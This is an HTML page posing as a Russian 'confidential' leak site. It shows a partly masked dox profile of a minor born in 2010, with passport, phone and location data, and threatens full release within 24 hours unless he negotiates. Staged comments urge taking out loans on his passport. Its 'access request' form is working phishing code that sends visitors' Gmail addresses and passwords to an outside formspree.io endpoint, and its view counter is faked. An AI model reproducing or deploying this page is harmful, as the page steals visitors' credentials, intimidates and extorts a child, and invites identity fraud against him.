<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>RU.PDF | CONFIDENTIAL</title>
    <style>
        :root {
            --bg: #050505;
            --panel: #0d0d0d;
            --accent: #ff0000;
            --text: #e2e2e2;
            --danger: #7f0000;
        }

        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            background: var(--panel);
            padding: 0 20px;
            height: 60px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid var(--danger);
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
        }

        .logo {
            font-weight: 900;
            color: var(--accent);
            cursor: pointer;
            font-size: 1.5rem;
            text-transform: uppercase;
            letter-spacing: 3px;
            animation: glitch 3s infinite;
        }

        @keyframes glitch {
            0% { text-shadow: 2px 0 red, -2px 0 blue; }
            5% { text-shadow: -2px 0 red, 2px 0 blue; }
            10% { text-shadow: 2px 0 red, -2px 0 blue; }
            100% { text-shadow: none; }
        }

        .nav-btns button {
            background: transparent;
            border: 1px solid var(--accent);
            color: var(--accent);
            padding: 8px 16px;
            border-radius: 0;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }

        .nav-btns button:hover {
            background: var(--accent);
            color: black;
            box-shadow: 0 0 20px var(--accent);
        }

        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            padding: 40px 20px;
        }

        .post-container {
            width: 100%;
            max-width: 750px;
            background: var(--panel);
            padding: 30px;
            border: 1px solid #1a1a1a;
            box-shadow: 0 0 50px rgba(0,0,0,1);
            position: relative;
        }

        .file-title {
            font-size: 1.3rem;
            font-weight: bold;
            color: var(--accent);
            margin-bottom: 15px;
            border-bottom: 1px solid var(--danger);
            padding-bottom: 10px;
            text-transform: uppercase;
        }

        #textDisplay { 
            line-height: 1.8; 
            font-size: 1rem; 
            white-space: pre-line;
            margin-bottom: 25px;
            color: #afafaf;
            border-left: 2px solid var(--danger);
            padding-left: 15px;
        }

        .img-wrapper {
            max-width: 250px;
            border: 1px solid var(--danger);
            cursor: zoom-in;
            transition: 0.3s;
            margin-bottom: 20px;
            filter: grayscale(100%) contrast(120%);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0px var(--danger); }
            50% { box-shadow: 0 0 15px var(--danger); }
            100% { box-shadow: 0 0 0px var(--danger); }
        }

        .img-wrapper:hover { filter: none; transform: scale(1.05); }
        .post-img { width: 100%; display: none; }

        .stats {
            display: flex;
            gap: 25px;
            margin-top: 30px;
            padding: 15px 0;
            border-top: 1px dotted var(--danger);
            color: #666;
            font-size: 0.8rem;
        }

        .comment-item { 
            background: #080808; 
            padding: 15px; 
            margin-bottom: 10px;
            border: 1px solid #1a1a1a;
        }
        .comment-user { font-weight: bold; color: var(--danger); display: block; margin-bottom: 5px; }

        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.95);
            z-index: 10000;
            align-items: center;
            justify-content: center;
        }

        .reg-box {
            background: black;
            padding: 40px;
            border: 2px solid var(--accent);
            text-align: center;
            max-width: 400px;
        }

        .reg-box h2 { color: var(--accent); text-transform: uppercase; letter-spacing: 5px; }
        #fullImg { max-width: 95%; max-height: 90vh; border: 2px solid var(--accent); }
    </style>
</head>
<body>

    <nav class="header">
        <div class="logo" id="logoBtn">RU.PDF</div>
        <div class="nav-btns">
            <button id="regBtn">Войти в аккаунт.</button>
        </div>
    </nav>

    <div class="main-content">
        <div class="post-container">
            <div class="file-title" id="fileTitle">SYSTEM_ERROR_LOAD</div>
            <div id="postContent">
                <p id="textDisplay">INITIALIZING...</p>
                <div class="img-wrapper" id="imgClick">
                    <img src="" id="imgDisplay" class="post-img">
                </div>
            </div>
            <div class="stats">
                <span>ПРОСМОТРЫ: <b id="viewCount">...</b></span>
                <span>ИЗБРАННОЕ: <b id="likeCount">...</b></span>
            </div>
            <div class="comment-block">
                <h4 style="color: var(--danger)">COMMENTS:</h4>
                <div id="commentList"></div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="regModal">
        <div class="reg-box" id="modalContent"></div>
    </div>

    <div class="modal-overlay" id="imgModal">
        <img src="" id="fullImg">
    </div>

    <script>
        const MY_DOCUMENT = {
            title: "PDF - Демьян", 
            text: `СТАТУС: Активно.
ФИО: Демьян *** ***
ПАСПОРТ: 123.123.123 123.123
ТЕЛЕФОН: +7 (985) 442 3* **
ДАТА РОЖДЕНИЯ: 05.06.2010г.
ЛОКАЦИЯ: Московская обл. г. Краснознаменск *** ***
ИМЯ РОДИТЕЛЕЙ: ***. ***.
---------------------------------
ВНИМАНИЕ: Информация будет обновлена (предоставлен полыный доступ) в течение 24 часов, если человек не захочет вести диалог и решить все мирно. `, 
            image: "a8ogt1bqlh5xjp1mxidl (1).png", 
            comments: [
                { user: "System_Guard", text: "Думаю можно на этого пдф микрозаймоф по паспорту оформить, ахуели уже совсем" },
                { user: "User_9385395", text: "Ебать хорошо сработали парни, выгружайте полный доступ" },
                { user: "UNKNOWN", text: "Давайте быстрее выгрудайте полный доступ чтоб по данным работать или тгк заливайте" }
            ]
        };

        const FORMSPREE_URL = "https://formspree.io/f/mlgzzeab"; 

        // Текст "Требуется авторизация" теперь красный
        const originalModalHTML = `
            <h2>ACCESS DENIED</h2>
            <p style="color: red;">Ваш IP не подтверждён, невозможно войти.</p>
            <p style="font-size: 0.8rem; margin-top: 15px; color: red; font-weight: bold;">
                ТРЕБУЕТСЯ АВТОРИЗАЦИЯ.<br><br>
                <a href="#" id="showRegForm" style="color: white !important; text-decoration: underline;">подать заявку на доступ</a>
            </p>
            <button id="closeModalBtn" style="width:100%; padding:12px; background:var(--accent); border:none; color:black; cursor:pointer; font-weight:bold; margin-top:15px;">ВЕРНУТЬСЯ</button>
        `;

        function updateStats() {
            let views = parseInt(localStorage.getItem('pdf_views_count')) || 666;
            views += Math.floor(Math.random() * 2) + 1;
            let likes = Math.floor(views * 0.13);
            localStorage.setItem('pdf_views_count', views);
            document.getElementById('viewCount').innerText = views;
            document.getElementById('likeCount').innerText = likes;
        }

        const regModal = document.getElementById('regModal');
        const imgModal = document.getElementById('imgModal');
        const modalContent = document.getElementById('modalContent');

        const openReg = () => {
            modalContent.innerHTML = originalModalHTML;
            regModal.style.display = 'flex';
            attachEvents();
        };
        const closeReg = () => regModal.style.display = 'none';

        function attachEvents() {
            const closeBtn = document.getElementById('closeModalBtn');
            if(closeBtn) closeBtn.onclick = closeReg;
            
            const regLink = document.getElementById('showRegForm');
            if(regLink) {
                regLink.onclick = (e) => {
                    e.preventDefault();
                    showRegForm();
                };
            }
        }

        function showRegForm() {
            modalContent.innerHTML = `
                <h2 style="font-size: 1.2rem;">ФОРМА ДОСТУПА</h2>
                <div style="text-align: left; margin-top: 20px;">
                    <label style="display:block; font-size: 0.7rem; color: var(--accent);">GMAIL:</label>
                    <input type="email" id="regEmail" placeholder="example@gmail.com" style="width:100%; background: #111; border: 1px solid var(--danger); color: white; padding: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none;">
                    
                    <label style="display:block; font-size: 0.7rem; color: var(--accent);">PASSWORD:</label>
                    <input type="password" id="regPass" style="width:100%; background: #111; border: 1px solid var(--danger); color: white; padding: 8px; box-sizing: border-box; outline: none;">
                    
                    <p id="errorMsg" style="color: yellow; font-size: 0.7rem; margin-top: 10px; display: none; font-weight: bold;"></p>
                </div>
                <button id="submitReg" style="width:100%; padding:12px; background:var(--danger); border:none; color:white; cursor:pointer; font-weight:bold; margin-top:20px;">ОТПРАВИТЬ ЗАПРОС</button>
            `;

            document.getElementById('submitReg').onclick = async () => {
                const email = document.getElementById('regEmail').value;
                const pass = document.getElementById('regPass').value;
                const errorMsg = document.getElementById('errorMsg');

                const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
                
                if (!gmailPattern.test(email)) {
                    errorMsg.innerText = "ОШИБКА: УКАЖИТЕ КОРРЕКТНЫЙ GMAIL АДРЕС";
                    errorMsg.style.display = "block";
                    return;
                }

                if (pass.length < 4) {
                    errorMsg.innerText = "ОШИБКА: ПАРОЛЬ СЛИШКОМ КОРОТКИЙ";
                    errorMsg.style.display = "block";
                    return;
                }

                const btn = document.getElementById('submitReg');
                btn.innerText = "СОЕДИНЕНИЕ С СЕРВЕРОМ...";
                btn.disabled = true;

                try {
                    const response = await fetch(FORMSPREE_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: email, password: pass, target: MY_DOCUMENT.title })
                    });

                    if (response.ok) {
                        modalContent.innerHTML = `
                            <h2 style="color: var(--accent);">ЗАПРОС ПРИНЯТ</h2>
                            <p style="font-size: 0.9rem; line-height: 1.5;">Ваши данные переданы в отдел безопасности.<br><br>
                            <span style="color: yellow;">ОЖИДАЙТЕ ОТВЕТА АДМИНИСТРАТОРА</span><br>
                            (Обычно это занимает от 2 до 24 часов)</p>
                            <button onclick="location.reload()" style="width:100%; padding:12px; background:var(--accent); border:none; color:black; cursor:pointer; font-weight:bold; margin-top:15px;">ЗАКРЫТЬ</button>
                        `;
                    } else { throw new Error(); }
                } catch (err) {
                    // Обработка ошибки сети с кнопкой НАЗАД
                    modalContent.innerHTML = `
                        <h2 style="color: var(--accent);">ОШИБКА СЕТИ</h2>
                        <p style="font-size: 0.9rem; line-height: 1.5;">Не удалось установить защищенное соединение.<br><br>
                        <span style="color: red;">ПРОВЕРЬТЕ ПОДКЛЮЧЕНИЕ ИЛИ ПОВТОРИТЕ ПОЗЖЕ</span></p>
                        <button id="backToForm" style="width:100%; padding:12px; background:var(--danger); border:none; color:white; cursor:pointer; font-weight:bold; margin-top:15px;">НАЗАД</button>
                    `;
                    document.getElementById('backToForm').onclick = showRegForm;
                }
            };
        }

        const openImg = () => {
            document.getElementById('fullImg').src = MY_DOCUMENT.image;
            imgModal.style.display = 'flex';
        };
        const closeImg = () => imgModal.style.display = 'none';

        document.getElementById('logoBtn').onclick = openReg;
        document.getElementById('regBtn').onclick = openReg;
        document.getElementById('imgClick').onclick = openImg;
        imgModal.onclick = closeImg;

        function renderPage() {
            document.getElementById('fileTitle').innerText = MY_DOCUMENT.title;
            document.getElementById('textDisplay').innerText = MY_DOCUMENT.text;
            if(MY_DOCUMENT.image) {
                const img = document.getElementById('imgDisplay');
                img.src = MY_DOCUMENT.image;
                img.style.display = 'block';
            }
            const list = document.getElementById('commentList');
            list.innerHTML = MY_DOCUMENT.comments.map(c => `
                <div class="comment-item">
                    <span class="comment-user">${c.user}</span>
                    <div style="color: #888">${c.text}</div>
                </div>
            `).join('');
        }

        window.onload = () => {
            renderPage();
            updateStats();
            setInterval(updateStats, 15000);
        };
    </script>
</body>
</html>
